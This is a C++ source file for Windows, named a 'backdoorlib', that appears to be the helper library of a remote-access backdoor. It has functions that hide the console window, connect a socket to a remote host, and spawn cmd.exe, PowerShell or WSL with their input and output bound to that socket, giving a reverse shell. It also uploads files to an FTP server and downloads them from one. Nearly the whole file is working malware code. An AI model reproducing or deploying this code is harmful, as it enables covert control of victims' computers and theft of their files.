// TCHAR t[100]; = char t[100];
// WCHAR t[100]; = wchar_t t[100];


using namespace std;
#include "backdoorlib.h"
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#include <sys/types.h>
#include <sys/types.h>
#include <sys/stat.h>

#include <errno.h>
#include <string.h>
#include <direct.h>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h> //-lwininet
#include <windows.h>
#include <lmcons.h>
#include <stdexcept>
#include <string>

#pragma comment(lib, "Ws2_32.lib")

#define BUFFER_SIZE_DEFAULT 4096

struct stat info;

TCHAR username[257];
char buffer[BUFFER_SIZE_DEFAULT];

using namespace std;

void hello_world(void){
    printf("Hello World ! By Unam3dd\n");
}

int StartsWith(const char *a, const char *b)
{
   if(strncmp(a, b, strlen(b)) == 0) return 1;
   return 0;
}

char * raw_input(char *input_string){
    char input_console[BUFFER_SIZE_DEFAULT];
    char return_input[BUFFER_SIZE_DEFAULT];
    printf("%s",input_string);
    return fgets(input_console,BUFFER_SIZE_DEFAULT,stdin);
}

int input(char *input_string)
{
    int number;
    printf("%s",input_string);
    scanf("%d",&number);
    return number;
}

void clear(void){
    system("cls");
}

TCHAR *get_username()
{
    DWORD username_len=UNLEN+1;
    GetUserName((TCHAR *)username, &username_len);
    return username;
}

int substring_in_string(char *substring,char *string){
    int c1 = 0;
    int c2 = 0;
    int i,y,fl;

    while (string[c1] != '\0'){
        c1++;
    }

    while (substring[c2] != '\0'){
        c2++;
    }

    for (i = 0; i <= c1 - c2; i++)
    {
        for (y = i; y < i + c2; y++){
            fl = 1;
            if (string[y] != substring[y - i]){
                fl = 0;
                break;
            }
        }

        if (fl == 1)
        {
            break;
        }
    }

    if (fl == 1){
        return 0;
    } else {
        return -1;
    }
}

int tchar_substring_in_string(char *substring,TCHAR *string)
{
    int c1 = 0;
    int c2 = 0;
    int i,y,fl;

    while (string[c1] != '\0'){
        c1++;
    }

    while (substring[c2] != '\0'){
        c2++;
    }

    for (i = 0; i <= c1 - c2; i++)
    {
        for (y = i; y < i + c2; y++){
            fl = 1;
            if (string[y] != substring[y - i]){
                fl = 0;
                break;
            }
        }

        if (fl == 1)
        {
            break;
        }
    }

    if (fl == 1){
        return 0;
    } else {
        return -1;
    }
}

void print(char *string)
{
    printf("%s\n",string);
}

int check_dir(char *pathname)
{
    if(stat(pathname,&info) !=0){
        return -1;
    } else if (info.st_mode & S_IFDIR){
        return 1;
    } else {
        return 0;
    }
}

void hide_console(void)
{
    FreeConsole();
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_MINIMIZE);
    ShowWindow(hWnd, SW_HIDE);
}

void sleep(int number)
{
    _sleep(number);
}

int connect(SOCKET socks_instance,struct sockaddr_in session)
{
    int c = WSAConnect(socks_instance,(struct sockaddr *)&session,sizeof(session),0,0,0,0);
    if (c != 0){
        closesocket(socks_instance);
        WSACleanup();
        return -1;
    }

    return 0;
}

int send(SOCKET socks_instance,char *buffer)
{
    sleep(100);
    int s = send(socks_instance,buffer,strlen(buffer)+1,0);
    if (s == SOCKET_ERROR){
        printf("[!] Send Failed Error Code : %d\n",WSAGetLastError());
        return -1;
    } else {
        return 0;
    }
}

int recv(SOCKET socks_instance,char *buffer,int len)
{
    sleep(100);
    int i;
    i = recv(socks_instance,buffer,len,0);
    if (i > 0){
        return i;
    } else if (i == 0){
        return 0;
    } else {
        return -1;
    }
}

void cmd_command(SOCKET socks_instance,char *command)
{
    char Process[BUFFER_SIZE_DEFAULT];
    sprintf(Process,"cmd.exe /c %s",command);
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks_instance;
    CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}


void powershell_command(SOCKET socks_instance,char*command)
{
    char Process[BUFFER_SIZE_DEFAULT];
    sprintf(Process,"powershell.exe -Command %s",command);
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks_instance;
    CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}

void wsl_command(SOCKET socks_instance,char *command)
{
    char Process[BUFFER_SIZE_DEFAULT];
    sprintf(Process,"wsl.exe -e %s",command);
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks_instance;
    CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}


void execute_process(SOCKET socks_instance,char *process)
{
    char Process[BUFFER_SIZE_DEFAULT];
    sprintf(Process,"%s",process);
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks_instance;
    CreateProcess(NULL,Process,NULL,NULL,TRUE,0,NULL,NULL,&sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}


void execute_cmd(SOCKET socks_instance)
{
    char Process[BUFFER_SIZE_DEFAULT] = "cmd.exe";
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo,0,sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks_instance;
    CreateProcess(NULL,Process,NULL,NULL,TRUE,0,NULL,NULL,&sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}

void execute_powershell(SOCKET socks_instance)
{
    char Process[BUFFER_SIZE_DEFAULT] = "powershell.exe";
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo,0,sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks_instance;
    CreateProcess(NULL,Process,NULL,NULL,TRUE,0,NULL,NULL,&sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}


int download_to_ftp(char* filename, char* ftp_host, int ftp_port,char *ftp_user,char *ftp_pass)
{
    HINTERNET hNet;
    hNet = InternetOpen("Ftp", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
    if (hNet != INVALID_HANDLE_VALUE)
    {
        HINTERNET hFtp = InternetConnect(hNet, ftp_host, ftp_port, ftp_user, ftp_pass, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
        if (hFtp != INVALID_HANDLE_VALUE)
        {
            if (FtpPutFile(hFtp, filename, filename, FTP_TRANSFER_TYPE_BINARY, 0))
            {
                return 0; // file envoyer au ftp
            }
            else {
                return -1; // file error
            }
            InternetCloseHandle(hFtp);
        }
    }
}

int cd(char *path)
{
    if (chdir(path) == 0) {
        return 0;
    }
    else {
        return -1;
    }
}

int download_on_ftp(char* filename, char* ftp_host, int ftp_port, char* ftp_user, char* ftp_pass)
{
    HINTERNET hNet;
    hNet = InternetOpen("Ftp", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
    if (hNet != INVALID_HANDLE_VALUE)
    {
        HINTERNET hFtp = InternetConnect(hNet, ftp_host, ftp_port, ftp_user, ftp_pass, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
        if (hFtp != INVALID_HANDLE_VALUE)
        {
            if (FtpGetFile(hNet, filename, filename,TRUE,FILE_ATTRIBUTE_NORMAL,FTP_TRANSFER_TYPE_BINARY, 0)) {
                return 0;
            }
            else {
                return -1;
            }
            InternetCloseHandle(hFtp);
        }
    }
}